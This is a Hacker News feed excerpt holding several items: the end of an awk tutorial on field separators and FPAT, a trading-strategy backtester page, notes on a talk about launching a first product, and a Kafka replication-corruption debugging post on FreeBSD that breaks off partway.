<div><div><pre><code><span>$ </span><span>awk</span> <span>'NR &lt;= 5 { print $1 }'</span> education.csv
T07,<span>"Enrolment
Region/Country/Area,,Year,Series,Value,Footnotes,Source
1,"</span>Total,
1,<span>"Total,
1,"</span>Total,
</code></pre></div></div>
<p>we can confirm that we‚Äôre splitting on spaces. awk has the option to specify a different field separator with the <code>-F 'separator'</code> flag:</p>
<div><div><pre><code><span>$ </span><span>awk</span> <span>-F</span> <span>','</span> <span>'NR &lt;= 5 { print $1 }'</span> education.csv
T07
Region/Country/Area
1
1
1
</code></pre></div></div>

<p>Great! But‚Ä¶. we had commas embedded within strings with double quotes. Sure enough, if we print the second field (<code>$2</code>), we see:</p>

<div><div><pre><code><span>$ </span><span>awk</span> <span>-F</span> <span>','</span> <span>'NR &lt;= 5 { print $2 }'</span> education.csv
<span>"Enrolment in primary

"</span>Total
<span>"Total
"</span>Total
</code></pre></div></div>

<p>Hmmm. What we want here is to split fields by <em>content</em>. Which awk does not have, but gawk (GNU awk) does: <a href="https://www.gnu.org/software/gawk/manual/gawk.html#Splitting-By-Content">FPAT</a>! From the gawk manual: ‚ÄúAll properly written awk programs should work with gawk. So most of the time, we don‚Äôt distinguish between gawk and other awk implementations.‚Äù</p>

<p>Sounds like we can use gawk here instead then. Let‚Äôs try pattern matching. I‚Äôm not going to go into regex here, but the pattern we want, defined by <code>"[^,]*|\"[^\"]+\""</code> is anything that either starts with a non-comma character, or starts with a double quote, contains only non-quote characters, and ends with a double quote:</p>

<div><div><pre><code><span>$ </span>gawk <span>'BEGIN { FPAT = "[^,]*|\"[^\"]+\"" } NR &lt;= 5 { print $2 }'</span> education.csv
<span>"Enrolment in primary, secondary and tertiary education levels"</span>

<span>"Total, all countries or areas"</span>
<span>"Total, all countries or areas"</span>
<span>"Total, all countries or areas"</span>
</code></pre></div></div>

<p>I snuck a <code>BEGIN</code> in there without explaining it. Let‚Äôs go on a brief tangent‚Ä¶</p>

<h3 id="begin--tangent-">BEGIN { tangent }</h3>

<p>Beyond the pattern and actions, awk also has a concept of <code>BEGIN</code> and <code>END</code> blocks. The <code>BEGIN</code> is executed before any of the data is processed. It can be useful for declaring variables or printing text to appear at the beginning. Analogously, the <code>END</code> is executed after the data is processed. It can be useful for performing manipulations on aggregates of the data, like averaging a sum.</p>

<p>This means if we wanted to write a little ‚ÄúHello, awk!‚Äù program, we could do it without even needing a data file.</p>

<div><div><pre><code><span>$ </span><span>awk</span> <span>'BEGIN { print "Hello, awk!" }'</span>
Hello, <span>awk</span><span>!</span>
</code></pre></div></div>

<h3 id="end--tangent-">END { tangent }</h3>

<p>‚Ä¶back to our example. In our case, we used a <code>BEGIN</code> block to declare the <code>FPAT</code> <em>before</em> reading our data file.</p>

<p>But, we‚Äôve only looked at the first 5 lines. For all we know, the rest of the file could look completely different. Let‚Äôs use <code>NR</code> again to see some more of the file. First, let‚Äôs figure out how long the file is. We can use the <code>END</code> block here. After we‚Äôve parsed the whole file, we can see what the value of <code>NR</code> is, and that‚Äôll tell us how many lines it is:</p>

<div><div><pre><code><span>$ </span><span>awk</span> <span>'END { print NR }'</span> education.csv
8630
</code></pre></div></div>

<p>Okay, so maybe if we print every 500 lines, we‚Äôll get a sense of what data we‚Äôre looking at. We can set our pattern to be only if <code>NR</code> is a multiple of <code>500</code>:</p>
<div><div><pre><code><span>$ </span><span>awk</span> <span>'NR % 500 == 0'</span> education.csv
</code></pre></div></div>

<p>‚Ä¶ and I‚Äôm going to leave this blog post on a real cliff hanger. Mostly because it already feels too long! There‚Äôs <a href="https://jemma.dev/blog/awk-part-2">a second post</a> about awk actually looking at the data and manipulating it to figure out which countries have stark differences in number of males and females that they educate.</p>

<h3 id="tldr-or-tlskimmed-far-enough-to-get-here-please-give-me-the-shorter-version">TL;DR or TL;Skimmed far enough to get here, please give me the shorter version:</h3>
<p>To rehash what we‚Äôve learned about awk:</p>
<ul>
  <li>awk is run using <code>awk 'awk_program' data-file</code></li>
  <li>awk programs have the form <code>pattern { action }; pattern { action };</code></li>
  <li><code>BEGIN</code> blocks are executed before reading data files</li>
  <li><code>END</code> blocks are executed after reading data files</li>
  <li><code>NR</code> is a variable that tells us the number of rows read</li>
  <li><code>-F '&lt;separator&gt;'</code> is how we can define a field separator for a file</li>
  <li>Space is the default field separator</li>
  <li><code>FPAT="..."</code> is a way to use regex to define a pattern for each field</li>
  <li><code>FPAT</code> is only defined in gawk</li>
</ul>


  </div>
</article>

      </div>
    </div></div>]]>
            </description>
            <link>https://jemma.dev/blog/awk-part-1</link>
            <guid isPermaLink="false">hacker-news-small-sites-24940661</guid>
            <pubDate>Fri, 30 Oct 2020 09:51:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Backtest Trading Strategies: A Quantopian Alternative]]>
            </title>
            <description>
<![CDATA[
Score 28 | Comments 11 (<a href="https://news.ycombinator.com/item?id=24940644">thread link</a>) | @hydershykh
<br/>
October 30, 2020 | https://www.tradytics.com/backtester | <a href="https://web.archive.org/web/*/https://www.tradytics.com/backtester">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

        <div>
          <p>
            <h4>Trading Strategies Backtester</h4>
            <h5>Backtest your favorite technical analysis based strategies with our backtester.</h5>
          </p>
          
        </div>

        <div>
          

          <div>
            <div>
              <p>
                <h5>Buy Strategy</h5>
              </p>
              <div>
                <div>
                  
                  <div aria-labelledby="dropdownMenuButtonBuy">
                    <p onclick="make_current_ta('RSI')">RSI</p>
                    <p onclick="make_current_ta('CCI')">CCI</p>
                    <p onclick="make_current_ta('MFI')">MFI</p>
                    <p onclick="make_current_ta('MACD')">MACD</p>
                    <p onclick="make_current_ta('ATR')">ATR</p>
                    <p onclick="make_current_ta('ADX')">ADX</p>
                    <p onclick="make_current_ta('STOCHS')">STOCHS</p>
                  </div>
                </div>
                
                
                </div>
              <div>
                <h6>Pre-made</h6>
                <div>
                  <div aria-labelledby="dropdownMenuButtonPremade">
                    <p onclick="make_current_strategy('EMA9 > EMA20')">9EMA &gt; 20EMA</p>
                    <p onclick="make_current_strategy('EMA20 > EMA50')">20EMA &gt; 50EMA</p>
                    <p onclick="make_current_strategy('EMA9 < EMA20')">9EMA &lt; 20EMA</p>
                    <p onclick="make_current_strategy('EMA20 < EMA50')">20EMA &lt; 50EMA</p>
                    <p onclick="make_current_strategy('EMA20 > Price')">20EMA &gt; Price</p>
                    <p onclick="make_current_strategy('EMA50 > Price')">50EMA &gt; Price</p>
                    <p onclick="make_current_strategy('EMA20 < Price')">20EMA &lt; Price</p>
                    <p onclick="make_current_strategy('EMA50 < Price')">50EMA &lt; Price</p>
                    <p onclick="make_current_strategy('obv_slope > 0')">Pos OBV Slope</p>
                    <p onclick="make_current_strategy('obv_slope < 0')">Neg OBV Slope</p>
                    <p onclick="make_current_strategy('VWAP > Price')">VWAP &gt; Price</p>
                    <p onclick="make_current_strategy('VWAP < Price')">VWAP &lt; Price</p>
                    <p onclick="make_current_strategy('SIGNAL > MACD')">Signal &gt; MACD</p>
                    <p onclick="make_current_strategy('SIGNAL < MACD')">Signal &lt; MACD</p>
                    <p onclick="make_current_strategy('hband > Price')">UpperBollinger &gt; Price</p>
                    <p onclick="make_current_strategy('lband < Price')">LowerBollinger &lt; Price</p>
                    <!--<p class="dropdown-item" onclick="make_current_strategy('At Support')">At Support</p>
                    <p class="dropdown-item" onclick="make_current_strategy('At Resistance')">At Resistance</p>-->
                  </div>
                </div>
                </div>
            </div>
          </div>



          <div>
            <div>
              <p>
                <h5>Sell Strategy</h5>
              </p>
              <div>
                <div>
                  
                  <div aria-labelledby="dropdownMenuButtonSell">
                    <p onclick="make_current_ta_sell('RSI')">RSI</p>
                    <p onclick="make_current_ta_sell('CCI')">CCI</p>
                    <p onclick="make_current_ta_sell('MFI')">MFI</p>
                    <p onclick="make_current_ta_sell('MACD')">MACD</p>
                    <p onclick="make_current_ta_sell('ATR')">ATR</p>
                    <p onclick="make_current_ta_sell('ADX')">ADX</p>
                    <p onclick="make_current_ta_sell('STOCHS')">STOCHS</p>
                  </div>
                </div>
                
                
                </div>
              <div>
                <h6>Pre-made</h6>
                <div>
                  <div aria-labelledby="dropdownMenuButtonPremadeSell">
                    <p onclick="make_current_strategy_sell('EMA9 > EMA20')">9EMA &gt; 20EMA</p>
                    <p onclick="make_current_strategy_sell('EMA20 > EMA50')">20EMA &gt; 50EMA</p>
                    <p onclick="make_current_strategy_sell('EMA9 < EMA20')">9EMA &lt; 20EMA</p>
                    <p onclick="make_current_strategy_sell('EMA20 < EMA50')">20EMA &lt; 50EMA</p>
                    <p onclick="make_current_strategy_sell('EMA20 > Price')">20EMA &gt; Price</p>
                    <p onclick="make_current_strategy_sell('EMA50 > Price')">50EMA &gt; Price</p>
                    <p onclick="make_current_strategy_sell('EMA20 < Price')">20EMA &lt; Price</p>
                    <p onclick="make_current_strategy_sell('EMA50 < Price')">50EMA &lt; Price</p>
                    <p onclick="make_current_strategy_sell('obv_slope > 0')">Pos OBV Slope</p>
                    <p onclick="make_current_strategy_sell('obv_slope < 0')">Neg OBV Slope</p>
                    <p onclick="make_current_strategy_sell('VWAP > Price')">VWAP &gt; Price</p>
                    <p onclick="make_current_strategy_sell('VWAP < Price')">VWAP &lt; Price</p>
                    <p onclick="make_current_strategy_sell('SIGNAL > MACD')">Signal &gt; MACD</p>
                    <p onclick="make_current_strategy_sell('SIGNAL < MACD')">Signal &lt; MACD</p>
                    <p onclick="make_current_strategy_sell('hband > Price')">UpperBollinger &gt; Price</p>
                    <p onclick="make_current_strategy_sell('lband < Price')">LowerBollinger &lt; Price</p>
                  </div>
                </div>
                </div>
            </div>
          </div>
          
          
        </div> <!-- row -->


         <!-- row -->

         <!-- row -->

         <!-- row -->

        <div>
          <div>
            <div>
              <div>
                <p>
                  <h6><i data-feather="activity"></i> Win Rate</h6>
                </p>
                <p>Win rate of this strategy.</p>
                
                
              </div>
            </div>
          </div>
          <div>
            <div>
              <div>
                <p>
                  <h6><i data-feather="corner-right-down"></i> Biggest Drawdown</h6>
                </p>
                <p>Highest loss incurred in a trade.</p>
                
              </div>
            </div>
          </div>
          <div>
            <div>
              <div>
                <p>
                  <h6><i data-feather="navigation-2"></i> Biggest Win</h6>
                </p>
                <p>Highest profit gained in a trade.</p>
                
              </div>
            </div>
          </div>
        </div> <!-- row -->


        <div>
          <div>
            <div>
              <div>
                <p>
                  <h6><i data-feather="arrow-up"></i> Long Only</h6>
                </p>
                <p>Profits and losses from long positions.</p>
                
              </div> 
            </div>
          </div>

          <div>
            <div>
              <div>
                <p>
                  <h6><i data-feather="arrow-down"></i> Short Only</h6>
                </p>
                <p>Profits and losses from short positions.</p>
                
              </div> 
            </div>
          </div>
        </div> <!-- row -->

        
        

      </div></div>]]>
            </description>
            <link>https://www.tradytics.com/backtester</link>
            <guid isPermaLink="false">hacker-news-small-sites-24940644</guid>
            <pubDate>Fri, 30 Oct 2020 09:48:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Notes on Nailing Your First Launch by Adam Wathan]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24940629">thread link</a>) | @reconquestio
<br/>
October 30, 2020 | https://samizdat.dev/notes-on-nailing-your-first-launch-by-adam-wathan/ | <a href="https://web.archive.org/web/*/https://samizdat.dev/notes-on-nailing-your-first-launch-by-adam-wathan/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
<article>
    <p>I‚Äôve just watched the talk ¬´Nailing Your First Launch¬ª (MicroConf Starter 2018) by Adam Wathan and I
took notes that I‚Äôd like to share and re-visit them in the future. Some of them are just text from his screens, some thoughts are mine.</p>
<p>But don‚Äôt let me steal the video from you by providing a digested summary.
In my humble opinion, the main idea of watching talks or reading something is to change your mind
model of seeing this topic.
Don‚Äôt hesitate and start watching the video before proceeding to notes.
The notes are here just to come back from time to time and re-call some especially useful highlights.</p>
<p><a href="https://www.youtube.com/watch?v=ajrDxZRpP9M">https://www.youtube.com/watch?v=ajrDxZRpP9M</a></p>
<hr>

<h3 id="one-time-purchase-products-are-way-easier-to-sell">One-time purchase products are way easier to sell</h3>
<ul>
<li>Harder to convince people that for $9 dollars per month they‚Äôd have value.</li>
<li>But it‚Äôs a very frequent case when people buy $100 courses and don‚Äôt even watch them.</li>
<li>One-time payments are much easier to go away with.</li>
</ul>
<h3 id="they-can-be-done">They can be ‚Äúdone‚Äù</h3>
<ul>
<li>You don‚Äôt have to maintain them forever.</li>
<li>A course can be finished. A book can be finished.</li>
</ul>
<h3 id="you-can-put-one-together-in-3-months-of-nights-and-weekends">You can put one together in 3 months of nights and weekends</h3>
<ul>
<li>Easier to plan.</li>
</ul>
<h3 id="they-put-money-in-the-bank-fast-then-drop-off-opposite-to-saas">They put money in the bank fast then drop off (opposite to SAAS)</h3>
<ul>
<li>One-time projects do have a more clear cliff of death, but they produce more money than saas during
launch days.</li>
</ul>
<hr>

<h3 id="building-an-audience">Building an audience</h3>
<ul>
<li>
<p>Having a big audience can compensate for almost any mistake made in marketing/sales.</p>
</li>
<li>
<p>Huge audience + bad sales plan produces way more profit than no audience + good sales plan.</p>
</li>
<li>
<p>Produce blog posts, tutorials, podcasts, screencasts, interview people</p>
</li>
<li>
<p>You should be worth following (provide a value for your audience)</p>
</li>
<li>
<p>Help people where they already are (Wes Bos)</p>
</li>
<li>
<p>Specific tactics for tech guys: tweet your hacks (like some tricks with css) that save you time.</p>
</li>
</ul>
<h3 id="picking-the-right-idea">Picking the right idea</h3>
<ul>
<li>Have an idea
<ul>
<li>what are you already putting out there that peoeple seem excited about?</li>
<li>what are you excited about that you think others will get excited about?</li>
<li>what do people think you‚Äôre better at than they are?</li>
<li>what have you learned outside your community would benefit from?</li>
<li>what did you have to figure out yourself but was really helpful to learn?</li>
</ul>
</li>
<li>Test it
<ul>
<li>
<p>¬´First thing to do is to put a landing page and start emailing.¬ª</p>
<p>It‚Äôs not a bad way, but it‚Äôs not the first thing that you should do.
Especially it doesn‚Äôt work if you have no audience. People wouldn‚Äôt trust you.</p>
</li>
</ul>
</li>
</ul>
<blockquote>
<p>Collect feedback from tweets, have a catalog of them. Can be used later for your landing/sales pages.</p>
</blockquote>
<h3 id="define-the-product">Define the product</h3>
<ul>
<li>Plan small, it will end up bigger than you think anyway
<ul>
<li>Don‚Äôt worry about size. A short book is still a book.</li>
<li>3 hours of a video course is plenty.</li>
<li>Actually, not everyone is looking for a full knowledge base on a specific topic and read
500 pages on that. Collection of great ideas (like tweets) on that specific topic works
too.</li>
</ul>
</li>
</ul>
<blockquote>
<p>In general, courses are easier to sell at higher prices because people expect products such as
books to be in a specific cost range, even if they understand that it brings a high value.</p>
</blockquote>
<h3 id="landing-page">Landing page</h3>
<p>The goal is to collect e-mail addresses.</p>
<p>Example of Adam‚Äôs landing page can be seen on 19:33 - 22:25</p>
<ul>
<li>Promise something in advance (sign up for free screencasts and a big discount)</li>
<li>You can put your catalog of feedback on your landing page to earn more trust.</li>
</ul>
<h3 id="pre-sell">Pre-sell</h3>
<h4 id="advantages">Advantages</h4>
<ul>
<li>Best form of product validation</li>
<li>You‚Äôll make more money</li>
<li>More motivation to finish</li>
<li>Can buy you the time to focus on the product</li>
</ul>
<h4 id="disadvantages">Disadvantages</h4>
<ul>
<li>Selling multiple tiers is trickier</li>
<li>Can‚Äôt easily change scope</li>
<li>Like taking on debt, can be extremely stressful. People paid you 50k$ and you have to return
it as the value in N months. (impostor syndrome?)</li>
</ul>
<h3 id="building-your-email-list">Building Your Email List</h3>
<ul>
<li>Always tell your audience.</li>
</ul>
<blockquote>
<p>Announce the announcement ‚Äî ¬´about to announce the next big project I‚Äôm working on; if you check
it out and are excited about it, I‚Äôd love any help spreading the word!¬ª</p>
</blockquote>
<ul>
<li>Share progress. Send an update every week or so.</li>
<li>Repurpose content (Take a chapter from a book, make it a blog post and share it)</li>
</ul>
<h3 id="getting-it-finished">Getting it finished</h3>
<p>A few strategies to finally finish it:</p>
<ul>
<li>Make promises (¬´this week I‚Äôm going to deliver a screencast¬ª)</li>
<li>Email on a schedule</li>
<li>Reduce scope. (the project/book gets bigger and bigger, the best way to cross the finish line</li>
</ul>
<h3 id="figuring-pricing">Figuring pricing</h3>
<ul>
<li>It‚Äôs hard to sell tiers during pre-sales.</li>
<li>Sell pre-orders with top tier price.</li>
</ul>
<h4 id="single-tier">Single tier</h4>
<ul>
<li>Can be fine if you can charge enough</li>
<li>Often necessary if pre-selling</li>
<li>Nice if you can‚Äôt figure out a way to add additional tiers that actually feel valuable</li>
<li>In general, prefer multiple tiers</li>
</ul>
<h4 id="two-tiers">Two tiers</h4>
<ul>
<li>Usually a price anchoring strategy, first tier makes second tier look like better deal</li>
<li>Second tier is usually the ‚Äúreal‚Äù product</li>
<li>Prices are often close-ish, maybe 1x and 1.5x</li>
<li>Works well with video courses where easy to cut content for budget version</li>
</ul>
<h4 id="three-tiers">Three tiers:</h4>
<ul>
<li>Great for books if you can come up with the bonus content (videos?)</li>
<li>Makes it easier to evaluate as its own product instead of compring to Amazon book prices</li>
<li>Prices are usually 1x, ~2x, ~5x</li>
<li>This will make you a lot more money from a book than just selling the book on its own</li>
</ul>
<blockquote>
<p><strong>Adam‚Äôs case</strong></p>
<ul>
<li>First tier: The Bare Essentials, $39
<ul>
<li>The 158-page book in pdf format</li>
<li>Comprehensive set of exercises</li>
</ul>
</li>
<li>Second tier: The Premium Training Package, $79
<ul>
<li>Over 4 hours of screencasts, covering all of the book examples</li>
<li>Three additional advanced tutorials</li>
</ul>
<ul>
<li>all from first tier</li>
</ul>
</li>
<li>Third tier: The complete Reference Package, $179
<ul>
<li>The source code of Nitpick CI, a production Laravel application that makes heavy
use of collection pipelines</li>
</ul>
<ul>
<li>all from second tier</li>
</ul>
</li>
</ul>
</blockquote>
<h3 id="launch-discounts">Launch discounts</h3>
<ul>
<li>Discount it by enough to be appealing, at least 30%</li>
<li>Use stepped discounts; lower discount on cheaper tiers and better discount on higher tiers</li>
<li>Reverse engineer non-discounted price from your planned discounted price, it‚Äôll help you charge more</li>
</ul>
<h3 id="nailing-the-launch">Nailing the launch</h3>
<ul>
<li>
<p>Build the sales page 39:13</p>
<ul>
<li>Still include an email sign up that sends preview content for new traffic (sign up to get
four free preview lessons)</li>
<li>Testimonials and social proof are important; use feedback from preview content to start</li>
<li>Sort tiers from highest price to lower price, use visuals to communicate value of higher
tiers (ui/ux hacks, make more important text bold, more physical things on a picture)</li>
</ul>
</li>
<li>
<p>Announce the launch details</p>
<ul>
<li>Include all package and pricing details</li>
<li>Complete TOC or content list</li>
<li>Final free content preview if possible</li>
</ul>
</li>
<li>
<p>Launch it</p>
<ul>
<li>Easiest part. Send an email ‚Äî ‚Äúxxx is now available!‚Äù, include discount</li>
<li>Launch on tuesday, no evidence, but it seems at least as good as any other day for Adam</li>
<li>Morning EST works well too</li>
</ul>
</li>
<li>
<p>Leverage early feedback</p>
<ul>
<li>Collect and catalog feedback after the launch.</li>
<li>Send new reviews to other people who hasn‚Äôt bought the course/book yet. Send them preview
of another chapter.</li>
</ul>
</li>
<li>
<p>Closing the launch</p>
<ul>
<li>Close the discount. Announce closing it. (‚ÄúHey, this is the last week of the launch‚Äù)</li>
<li>But don‚Äôt specify a closing date in advance</li>
</ul>
</li>
</ul>
<hr>
<h3 id="links">Links</h3>
<ul>
<li><a href="https://gist.github.com/adamwathan/30dc4230ac575cfa3425b39ca11ea859">Gist with useful links by Adam</a></li>
<li><a href="https://twitter.com/adamwathan">Twitter: @adamwathan</a></li>
<li><a href="https://adamwathan.me/">Blog: adamwathan.me</a></li>
<li><a href="https://www.youtube.com/watch?v=ajrDxZRpP9M">Talk on youtube</a></li>
</ul>
</article>

        </div></div>]]>
            </description>
            <link>https://samizdat.dev/notes-on-nailing-your-first-launch-by-adam-wathan/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24940629</guid>
            <pubDate>Fri, 30 Oct 2020 09:46:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Kafka nightmare replication issues on FreeBSD (2018)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24940623">thread link</a>) | @letientai299
<br/>
October 30, 2020 | https://stacksoft.io/blog/kafka-troubles/ | <a href="https://web.archive.org/web/*/https://stacksoft.io/blog/kafka-troubles/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	  <div>
        <div>
		  

<p>I recently created a tool for a client to export some data from a Kafka topic and after waiting about 10 minutes for it to export, the program returned a rather bizarre error:</p>

<pre><code>kafka: error while consuming telemetry/0: kafka server: Message contents does not match its CRC.

</code></pre>

<p>Intuition gave me a bad feeling about that error, but I was not prepared for what was going to come next. I decide to look up the error quickly and the error indicated that the CRC calculated by the consumer was not matching the message header. Huh, what was going on here?</p>

<p>Before I dive into this article, it‚Äôs helpful to learn a little bit about the software that was being run when we started running into this problem. We had 3 VMs on an Azure cluster that were running FreeBSD. The producers were using <a href="https://github.com/Shopify/sarama">https://github.com/Shopify/sarama</a> and the consumers were using <a href="https://github.com/bsm/sarama-cluster">https://github.com/bsm/sarama-cluster</a></p>

<p>What‚Äôs also interesting is, no matter how many machines we might have had in the cluster (if they were all FreeBSD), we most likely would have experienced failure across the board. This wasn‚Äôt really great since the entire point of replicating the cluster across N machines was to prevent complete system failure. In this case, it really wouldn‚Äôt have helped us. A tear falls down my cheek for failed distributed programming promises.</p>

<table>
<thead>
<tr>
<th>Software</th>
<th>Version</th>
</tr>
</thead>

<tbody>
<tr>
<td>FreeBSD</td>
<td>11.0-RELEASE-p8</td>
</tr>

<tr>
<td>ZFS</td>
<td>-</td>
</tr>

<tr>
<td>Kafka</td>
<td>0.10.2</td>
</tr>

<tr>
<td>Zookeeper</td>
<td>3.4.10</td>
</tr>

<tr>
<td>OpenJDK</td>
<td>1.8.0_121-b13</td>
</tr>

<tr>
<td>Sarama</td>
<td>5e8fd95863bd4a894fcd29225547d56967f189ad</td>
</tr>

<tr>
<td>Sarama-cluster</td>
<td>d98592677c0aa08d8aafb882d344fb461682b722</td>
</tr>
</tbody>
</table>

<p>A little bit after my export tool ran, I got a ping on Slack that one of the services that uses this Kafka topic was no longer working. I check the logs of that service, and sure enough, the same error:</p>

<pre><code>kafka: error while consuming topic/0: kafka server: Message contents does not match its CRC.

</code></pre>

<p>Because this was a live running service, my first thought was to use the power of Kafka to shift the offset by 1 for this particular consumer so we can skip this corrupt message and get everything running again quickly.</p>

<p><code>kafka-consumer-groups.sh</code> is a command line tool that let‚Äôs you do exactly this, except it doesn‚Äôt work on <code>kafka-0.10.2</code>. That was a little bit of a surprise to me, I assumed one of the coolest things about Kafka is that you can pick an offset to consume from. The libraries we were using also had no way to manually select an offset to start from.</p>

<p>Okay, crap, so I need to upgrade Kafka to shift the offsets. This is a good opportunity to get on <code>1.0.0</code> anyway and perhaps restarting the services will actually fix the problem. I update my Ansible scripts for <code>kafka 1.0.1</code> and start reading the upgrade guide for a live running environment: <a href="https://kafka.apache.org/documentation/#upgrade">https://kafka.apache.org/documentation/#upgrade</a>.</p>

<p>Great, we‚Äôre on <code>1.0.1</code>, but the problem still exists. I have the ability to move the offet over, so I shift the offset by 1.</p>

<pre><code>./kafka-consumer-groups.sh --bootstrap-server localhost:9092 --group "api-consumer-group" --topic "telemetry:0" --reset-offsets --shift-by 1 --execute
</code></pre>

<p>I restart the service and the error comes up again. Darn. So it‚Äôs not only one message that is corrupt, it‚Äôs a range, that‚Äôs not great. I decided to commit to this strategy because this service needed to be up and running for a live demo in the coming week.</p>

<p>So instead, my idea was to shift the offset by a larger number until I find a number that actually works. Once I find a number that works, I can do a manual binary search to find the exact offset where the corruption started and shift it by 1.</p>

<p>After doing a manual binary search, I have found that the corrupted records are between <code>23769420-23772231</code> inclusive and corrupted, so good messages begin at <code>23772232</code> so 2811 corrupted messages. I run <code>./kafka-consumer-groups.sh</code> again, but this time I specify the exact offset to start from instead of using <code>shift-by</code></p>

<p>I restart the service again, and it works! Great, let‚Äôs hope this monkey patch works until the live demo. Nope, the next day, the same message appears again.</p>

<p>At this point, I‚Äôve had my fair share of complicated problems, and I have a deep gut instinct that it‚Äôs most likely not the code we‚Äôve written because the problem started to appear on multiple other topics in the cluster and the problem was produced by multiple independent services.</p>

<p>Of course, the book Pragmatic Programmer still pops up in my head:</p>

<p><em>‚Äúselect‚Äù Isn‚Äôt Broken</em>:</p>

<blockquote>
<p>It is rare to find a bug in the OS or the compiler, or even a third-party product or library. The bug is most likely in the application.</p>
</blockquote>

<p>So I focus on starting from the application and then working outwards, I upgrade our libraries used in our code. I upgrade Sarama to <code>1.6.0</code> and I upgrade <code>sarama-cluster</code> to <code>master</code>. I run our deployment scripts and everything is running again.</p>

<p>I do the ridiculous offset binary-search trick again to shift everything and sure enough the issue comes up again with our Kafka libraries upgraded to the latest version. I decide to look at the logs of the broker themslelves and this is what I see;</p>

<pre><code>[2018-03-17 20:11:58,551] ERROR [ReplicaFetcher replicaId=1, leaderId=3, fetcherId=0] Error for partition telemetry-0 to broker 3:org.apache.kafka.common.errors.CorruptRecordException: This message has failed its CRC checksum, exceeds the valid size, or is otherwise corrupt. (kafka.server.ReplicaFetcherThread)
[2018-03-17 20:11:58,747] ERROR [ReplicaFetcher replicaId=1, leaderId=2, fetcherId=0] Error for partition topic-2 to broker 2:org.apache.kafka.common.errors.CorruptRecordException: This message has failed its CRC checksum, exceeds the valid size, or is otherwise corrupt. (kafka.server.ReplicaFetcherThread)
</code></pre>

<p>Looking at that error message, it appears that the replica thread inside of Kafka is running into exactly the same problem as our consumers. Uh oh, at this point I know it‚Äôs definitely not our application code, so much for that Pragmatic Programmer tip, gut instinct all the way!</p>

<p>There is a Kafka tool to let‚Äôs you see deeper into the health of your cluster <code>./kafka-topics.sh --zookeeper localhost:2181 --describe</code>. Here‚Äôs the output:</p>

<pre><code>Topic:telemetry PartitionCount:6 ReplicationFactor:3 Configs:
 Topic: telemetry Partition: 0 Leader: 2 Replicas: 2,1,3 Isr: 2
 Topic: telemetry Partition: 1 Leader: 3 Replicas: 3,2,1 Isr: 3
 Topic: telemetry Partition: 2 Leader: 1 Replicas: 1,3,2 Isr: 1
 Topic: telemetry Partition: 3 Leader: 2 Replicas: 2,3,1 Isr: 2
 Topic: telemetry Partition: 4 Leader: 3 Replicas: 3,1,2 Isr: 3
 Topic: telemetry Partition: 5 Leader: 1 Replicas: 1,2,3 Isr: 1
</code></pre>

<p>If you look at the <code>Isr</code> column, it stands for <code>In-Sync</code> replica. It appears that this cluster is not healthy because only the leader broker is in sync while all the other brokers cannot replicate that partition. Our goal here is to get that <code>Isr</code> column back to <code>1,2,3</code>.</p>

<p>So at this point, here are the options:</p>

<ul>
<li>- Hardware failure, such as disk failure, or network connectivity issues.</li>
<li>- The cluster is misbehaving because of resource allocation issues, perhaps it‚Äôs going OOM, or we‚Äôre out disk space.</li>
<li>- A bug with the Kafka version we were using</li>
<li>- An OpenJDK bug</li>
</ul>

<p>I decide to quickly look into our various servers to see if this is a resource allocation issue that is causing Kafka to misbehave. This was a red herring, one of the servers that was responsible for pushing to this topic actually filled its root partition and for a second I thought that might have been the issue, but that issue was fixed and the issue still remained.</p>

<p>The actual Kafka instances seemed to be fine, they were nowhere near capacity in terms of disk space, and the chances of having hardware failure across 3 machines was unlikely.</p>

<p>it gets a little confusing on what could be wrong and I start to realize that this is becoming a difficult problem and we have to get this live system working. I can‚Äôt just adjust things at random and hope that the problem is fixed. It‚Äôs time to dig deeper, it‚Äôs time to look at what Kafka is actually writing to disk.</p>

<h3 id="digging-deeper">Digging deeper</h3>

<p>Kafka writes the messages it receives into a log folder. The log folder contains a folder for each topic and partition combo. This is how it might look for this particular topic we‚Äôre having issues with:</p>

<pre><code>.
|-- telemetry-0
|   |-- 00000000000000000000.index
|   |-- 00000000000000000000.log
|   |-- 00000000000000000000.timeindex
|   |-- 00000000000003859610.index
|   |-- 00000000000003859610.log
|   |-- 00000000000003859610.snapshot
|   |-- 00000000000003859610.timeindex
|   |-- 00000000000008551431.index
|   |-- 00000000000008551431.log
|   |-- 00000000000008551431.snapshot
|   |-- 00000000000008551431.timeindex
|   |-- 00000000000012458429.snapshot
|   `-- leader-epoch-checkpoint
|-- telemetry-1
|   |-- 00000000000000000000.index
|   |-- 00000000000000000000.log
|   |-- 00000000000000000000.timeindex
|   |-- 00000000000003854233.index
|   |-- 00000000000003854233.log
|   |-- 00000000000003854233.timeindex
|   |-- 00000000000008541867.index
|   |-- 00000000000008541867.log
|   |-- 00000000000008541867.timeindex
|   `-- leader-epoch-checkpoint
|-- telemetry-2
|   |-- 00000000000000000000.index
|   |-- 00000000000000000000.log
|   |-- 00000000000000000000.timeindex
|   |-- 00000000000003850719.index
|   |-- 00000000000003850719.log
|   |-- 00000000000003850719.timeindex
|   |-- 00000000000008543680.index
|   |-- 00000000000008543680.log
|   |-- 00000000000008543680.timeindex
|   `-- leader-epoch-checkpoint

</code></pre>

<p>The <code>.log</code> file is where the messages we push to Kafka are stored. We‚Äôre going to attempt to extract the offset that is corrupt to see what exactly is corrupt about it. If you‚Äôre curious on learning about the internals of Kafka, check out this article, it was a lot simpler than I thought: <a href="https://thehoard.blog/how-kafkas-storage-internals-work-3a29b02e026">https://thehoard.blog/how-kafkas-storage-internals-work-3a29b02e026</a></p>

<p>Kafka provides a tool, <code>kafka.tools.DumpLogSegments</code> that lets you dive into these log files and grab more details about individual records that are in the file. Hilariously enough, when I ran this tool, it bails right when it hits a corrupt message.</p>

<pre><code>Exc‚Ä¶</code></pre></div></div></div></div>
